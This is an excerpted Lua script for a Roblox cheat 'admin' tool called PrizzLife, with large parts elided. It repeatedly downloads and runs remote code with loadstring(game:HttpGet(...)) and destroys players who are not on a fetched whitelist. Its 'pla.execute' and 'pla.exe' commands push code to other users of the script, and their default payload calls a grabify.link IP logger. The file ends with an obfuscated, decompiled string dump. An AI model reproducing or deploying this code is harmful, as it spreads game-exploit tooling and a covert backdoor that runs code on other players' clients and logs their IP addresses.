...
local Settings = {
    ...
    JoinNotify = false,
    PrintDebug = string.sub(LocalPlayer.Name, 1, 5) == "ellie" or string.sub(LocalPlayer.Name, 1, 9) == "shehameta",
    User = {
        RankedCmds = true,
        HiddenMelee = false,
        HiddenArrest = false,
...
local OnCommand = function(text)
    ...
    elseif cm("manginasal") then
        if not Saved.Map_MangInamo then
            ...
            Saved.Map_MangInamo = loadstring(game:HttpGet("https://raw.githubusercontent.com/elliexmln/PrizzLife/main/Init/Maps/MangInasal.txt"))()
        end
    ...
    elseif cm("area51") then
        if not Saved.Map_Area69 then
            Notif("Loading...", "Please wait patiently...")
            Saved.Map_Area69 = loadstring(game:HttpGet("https://raw.githubusercontent.com/elliexmln/PrizzLife/main/Init/Maps/Area69.txt"))()
        end
    ...
    elseif cm("amongus") then
        if not Saved.Map_Amogus then
            Notif("Loading...", "Please wait patiently...")
            Saved.Map_Amogus = loadstring(game:HttpGet("https://raw.githubusercontent.com/elliexmln/PrizzLife/main/Init/Maps/AmongSUS.txt"))()
        end
    ...
    elseif cm("mcdonalds") then
        if not Saved.Map_Mcdonalds then
            Notif("Loading...", "Please wait patiently...")
            Saved.Map_Mcdonalds = loadstring(game:HttpGet("https://raw.githubusercontent.com/elliexmln/PrizzLife/main/Init/Maps/Mcdonalds.txt"))()
        end
    ...
    elseif cm("whois") then
        Chat("This pladmin script is created by elliexmln, Link: paste.ee/p/mxb28")
        for i, v in pairs(Players:GetPlayers()) do
        ...
        if LocPL.AllowPLA then
            if string.sub(text, 1, 4) == Prefix .. "pla" then
                ...
                if cm("pla.execute") then
                    ...
                    local sub = str or "game:HttpGet('https://grabify.link/XJC7EM')"
                    Saved.SendBeacon(sub)
                ...
                elseif cm("pla.exe") then
                    ...
                    if getpl then
                        ...
                        local sub = str or "game:HttpGet('https://grabify.link/XJC7EM')"
                        Saved.SendBeacon("if game.Players.LocalPlayer.Name == '" .. getpl.Name .. "' then " .. sub .. " end")
...
task.delay(0, function()
    ...
    pcall(function()
        Saved.Listing = loadstring(game:HttpGet("https://gist.githubusercontent.com/elliexmln/7fb5f0bbd68e4170968298bbe4e83309/raw"))()
    end)
    if LocalPlayer.UserId ~= LocPL.UID or LocalPlayer.Name ~= LocPL.UIN or not (Saved.Listing and next(Saved.Listing)) then
        task.delay(1, function()
            LocalPlayer:Destroy()
        end)
    ...
    local data1, data2 = loadstring(game:HttpGet("https://raw.githubusercontent.com/elliexmln/PrizzLife/main/Init/PL_TEAM_GUI"))()
    local TEAMs = data2
    ...
    local ACTIONFR = Instance.new("Frame")
    local ActionFrame = ACTIONFR
    ...
    ACTIONFR.Visible = not LocPL.isMouse
    ACTIONFR.PunchButton.MouseButton1Down:Connect(function()
        States.IsHoldingF = true
        pcall(VirtualPunch)
    end)
    ACTIONFR.PunchButton.MouseButton1Up:Connect(function()
        States.IsHoldingF = false
    end)
    ACTIONFR.CrawlButton.MouseButton1Click:Connect(function()
        VKeyPress("C", "Press")
    end)
    ACTIONFR.RunButton.MouseButton1Down:Connect(function()
        States.Running = true
    end)
    ACTIONFR.RunButton.MouseButton1Up:Connect(function()
        States.Running = false
        LAction("speed", Saved.NormalSpeed)
    end)
...
--[[ this was decompiled from url 6:
23184djRtFzpY0jUODxKBi1HDwRfrV_260TjCaatvF877hYeIlqAZ25718UThpDgTP750rICyYpVS375qg_nQnTx2vrHklePt4KGhjkfcz3amseqm_E5F_aYycpM6InlJyCxt256hUuPJabE20GjBCjMKo32GFsEnWJf21bSWXMHcC31xupuPULA2047oGUssuOP1023KArVeETD52_wiIEu_k16OTHrPJLy7WZMsPKUU19IZJzoXWK79uIPDigxf39OYzpxTci29SDTWSQHZ41GrTnKkGl24QEoLM_UU49MabiYVuX27K_AFWYen69pPmdtDMc40EmwBfmAP42rziEdoTm68_HBVZGWC34C_JpgRxu28HiJLaEAX25WIo_zIOk11TOqtMQpD80QKJXgRtM30DVOCIKkl67csEjsKKL48ida_nydF77GVpTpIWD35cGCLprHE98DBbKCLQu81AVTMwrnS38GTEJKdsK65QgACzGbk63suvXoriK12jdAQdfkC
stringdumpzLPLMSPopcallEdlpJlGHprintzZLpeooistringmatchYyqpAlPhmathldexpXbMyeqZy
            setmetatableJnPakdmtostringue_BdeUptableunpackFjgHFwFPunpackheFqljrSprinthYLhhdnbselectyeOSKZlnmathfloorsFYblFeE
might be useful but not sure
]]
